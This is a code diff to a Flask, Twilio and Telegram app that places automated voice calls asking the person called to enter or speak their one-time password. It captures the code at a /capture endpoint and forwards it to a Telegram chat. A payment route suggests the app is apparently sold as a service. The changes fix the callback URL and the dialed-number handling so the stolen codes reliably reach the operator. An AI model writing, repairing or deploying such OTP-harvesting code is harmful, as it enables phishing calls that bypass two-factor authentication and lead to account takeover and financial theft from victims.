@@ -281,7 +281,13 @@ def telegram_webhook():
 def voice():
     message = request.args.get("msg", "Please enter your OTP now.")
     resp = VoiceResponse()
-    gather = Gather(input="dtmf speech", timeout=10, num_digits=6, action="/capture", method="POST")
+    gather = Gather(
+        input="dtmf speech",
+        timeout=10,
+        num_digits=6,
+        action=f"{PUBLIC_BASE_URL}/capture",   # ✅ absolute URL
+        method="POST"
+    )
     gather.say(message)
     gather.say("Now, please enter or speak your OTP.")
     resp.append(gather)
@@ -291,13 +297,12 @@ def voice():
 @flask_app.route("/capture", methods=["POST"])
 def capture():
     otp = request.values.get("Digits") or request.values.get("SpeechResult")
-    # Twilio webhooks: From = caller, To = your Twilio number
-    # You stored phone_to_chat by user's own phone (destination you dialed),
-    # so try From and To to cover both cases.
-    phone = request.values.get("From") or request.values.get("To")
-    if phone:
-        captured_otp[phone] = otp
-        chat_id = phone_to_chat.get(phone)
+    to_number = request.values.get("To")   # ✅ the user’s number (we dialed this)
+    log.info("Twilio /capture To=%s OTP=%s", to_number, otp)
+
+    if to_number and otp:
+        captured_otp[to_number] = otp
+        chat_id = phone_to_chat.get(to_number)
         if chat_id:
             try:
                 fut = asyncio.run_coroutine_threadsafe(
@@ -307,6 +312,7 @@ def capture():
                 fut.result(timeout=5)
             except Exception:
                 log.exception("Failed to send OTP to Telegram")
+
     resp = VoiceResponse()
     resp.say("Thanks! Your OTP has been captured. Goodbye!")
     return Response(str(resp), mimetype="text/xml")
@@ -314,8 +320,10 @@ def capture():
 @flask_app.route("/call_status", methods=["POST"])
 def call_status():
     call_status_val = request.values.get("CallStatus")
-    to_number = request.values.get("To") or request.values.get("Called")
+    to_number = request.values.get("To")   # ✅ consistent with phone_to_chat
     chat_id = phone_to_chat.get(to_number)
+    log.info("Call status %s for %s", call_status_val, to_number)
+
     if chat_id:
         status_map = {
             "initiated": "📞 Call has been initiated.",
@@ -334,7 +342,7 @@ def call_status():
         except Exception:
             log.exception("Failed to send call status to Telegram")
     return ("", 204)
-
+    
 @flask_app.route("/success")
 def payment_success():
     user_id = request.args.get("user_id")
@@ -387,3 +395,4 @@ if __name__ == "__main__":
     log.info("Starting Flask on port %s", PORT)
     # Render launches this file with `python otp.py`
     flask_app.run(host="0.0.0.0", port=PORT)
+
